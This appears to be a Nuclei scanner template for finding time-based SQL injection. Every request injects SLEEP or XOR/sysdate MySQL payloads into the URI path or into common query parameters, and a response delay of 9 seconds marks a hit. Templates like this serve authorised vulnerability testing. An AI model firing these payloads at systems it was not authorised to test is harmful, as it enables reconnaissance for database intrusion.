id: time-based-sqli-uri-finder

info:
  name: Time-Based SQL Injection in URI
  description: Test for Time-Based SQL Injection in URI
  author: erickfernandox
  severity: high
  tags: sqlinjection


requests:
  - method: GET
    path:
      - "{{BaseURL}}/dont-work-sqli"
      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/"
      - "{{BaseURL}}/0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z"      
      - "{{BaseURL}}/(SELECT(0)FROM(SELECT(SLEEP(9)))a)/"
      - "{{BaseURL}}/,(select * from (select(sleep(9)))a)/"
      - "{{BaseURL}}/1) or sleep(9)#/"   
      - "{{BaseURL}}/1' and sleep(10)"   
      - "{{BaseURL}}/AND SLEEP(9)--"     
      - "{{BaseURL}}/' AND SLEEP(9) AND '1"     
      - "{{BaseURL}}/ ORDER BY SLEEP(5)/"     
      - "{{BaseURL}}/AND (SELECT * FROM (SELECT(SLEEP(9)))bAKL) AND 'vRxe'='vRxe" 
      - "{{BaseURL}}/?article_id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&category=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&city=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&country=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&email=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&language=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&page=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&password=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&product_id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&search=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&state=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&user=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&username=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z&zip=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z"
      - "{{BaseURL}}/?article_id=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&category=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&city=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&country=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&email=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&id=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&language=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&page=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&password=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&product_id=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&search=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&state=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&user=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&username=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z&zip=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%289%29%2C0%29%29XOR%27Z"
      - "{{BaseURL}}/?article_id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&category=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&city=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&country=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&email=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&language=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&page=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&password=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&product_id=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&search=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&state=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&user=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&username=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/&zip=0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z/"
      - "{{BaseURL}}/?article_id=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&category=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&city=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&country=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&email=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&id=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&language=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&page=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&password=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&product_id=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&search=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&state=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&user=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&username=(SELECT(0)FROM(SELECT(SLEEP(9)))a)&zip=(SELECT(0)FROM(SELECT(SLEEP(9)))a)"
      - "{{BaseURL}}/?article_id=' AND SLEEP(9) AND '1&category=' AND SLEEP(9) AND '1&city=' AND SLEEP(9) AND '1&country=' AND SLEEP(9) AND '1&email=' AND SLEEP(9) AND '1&id=' AND SLEEP(9) AND '1&language=' AND SLEEP(9) AND '1&page=' AND SLEEP(9) AND '1&password=' AND SLEEP(9) AND '1&product_id=' AND SLEEP(9) AND '1&search=' AND SLEEP(9) AND '1&state=' AND SLEEP(9) AND '1&user=' AND SLEEP(9) AND '1&username=' AND SLEEP(9) AND '1&zip=' AND SLEEP(9) AND '1"      
      - "{{BaseURL}}/?article_id=ORDER BY SLEEP(5)/&category=ORDER BY SLEEP(5)/&city=ORDER BY SLEEP(5)/&country=ORDER BY SLEEP(5)/&email=ORDER BY SLEEP(5)/&id=ORDER BY SLEEP(5)/&language=ORDER BY SLEEP(5)/&page=ORDER BY SLEEP(5)/&password=ORDER BY SLEEP(5)/&product_id=ORDER BY SLEEP(5)/&search=ORDER BY SLEEP(5)/&state=ORDER BY SLEEP(5)/&user=ORDER BY SLEEP(5)/&username=ORDER BY SLEEP(5)/&zip=ORDER BY SLEEP(5)/"
      
    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - 'duration>=9'
